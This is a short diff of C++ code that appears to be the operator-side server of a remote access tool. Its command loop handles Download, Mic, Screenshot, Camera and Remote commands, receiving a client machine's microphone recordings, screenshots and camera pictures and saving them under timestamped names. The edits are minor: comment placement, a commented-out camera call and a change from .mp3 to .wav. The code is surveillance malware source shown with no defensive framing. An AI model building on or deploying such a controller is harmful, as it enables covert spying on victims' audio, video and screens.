@@ -137,24 +137,24 @@ int main(int argc, char* argv[]) {
 			break;
 		}
 
+		//Download Function - Send file to client.
 		if (command.compare("Download") == 0) {
-			//Download Function - Send file to client.
 			sendFile(option.c_str(), clientSocket);
 		}
 
+		//Receive client's micro recording.
 		if (command.compare("Mic") == 0) {
-			//Receive client's micro recording.
 			receiveFile(FILE_TYPE_RECORDING, clientSocket);
 		}
 
+		//Receive client's screenshot.
 		if (command.compare("Screenshot") == 0) {
-			//Receive client's screenshot.
 			receiveFile(FILE_TYPE_SCREENSHOT, clientSocket);
 		}
 
+		//Receive client's camera picture.
 		if (command.compare("Camera") == 0) {
-			//Receive client's camera picture.
-			receiveFile(FILE_TYPE_CAMERA, clientSocket);
+			//receiveFile(FILE_TYPE_CAMERA, clientSocket);
 		}
 
 		if (command.compare("Remote") == 0) {
@@ -262,7 +262,7 @@ void sendFile(const char* fileName, SOCKET clientSocket) {
 }
 // receive file from client and save
 void receiveFile(int fileType, SOCKET clientSocket) {
-	char* buffer = NULL, * filePath = NULL;
+	char* buffer = NULL, *filePath = NULL;
 	HANDLE file = NULL;
 	int iResult = 0;
 	DWORD dwByteWritten = 0;
@@ -287,7 +287,7 @@ void receiveFile(int fileType, SOCKET clientSocket) {
 		if (fileType == FILE_TYPE_RECORDING) {
 			fileName += "Recording ";
 			fileName += now;
-			fileName += ".mp3";
+			fileName += ".wav";
 		}
 		if (fileType == FILE_TYPE_SCREENSHOT) {
 			fileName += "Screenshot ";
